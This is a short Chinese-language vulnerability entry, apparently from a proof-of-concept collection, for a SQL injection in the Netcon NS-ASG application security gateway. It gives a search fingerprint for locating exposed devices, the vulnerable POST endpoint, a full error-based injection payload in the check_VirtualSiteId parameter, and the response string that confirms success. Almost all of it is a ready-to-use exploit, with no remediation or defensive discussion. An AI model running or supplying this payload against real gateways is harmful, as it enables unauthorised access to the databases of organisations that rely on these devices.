# 网康应用安全网关(NS-ASG)SQL注入漏洞

网康应用安全网关(NS-ASG) ｜ SQL注入 ｜ —
- **指纹**：`"网康-NS-ASG-应用安全网关"`
- **请求**：`POST /vpnweb/index.php?para=index HTTP/1.1`

**Payload**
```
check_username=123&check_username1=123&check_passwd=123&action=login_check&check_VirtualSiteId=1/**/and/**/updatexml(1,concat(0x7e,(md5(123))),3)#&imgcode=undefined&selvalue=2&BackgroundName=background.gif
```
- **响应特征**：200 202cb962ac59075b9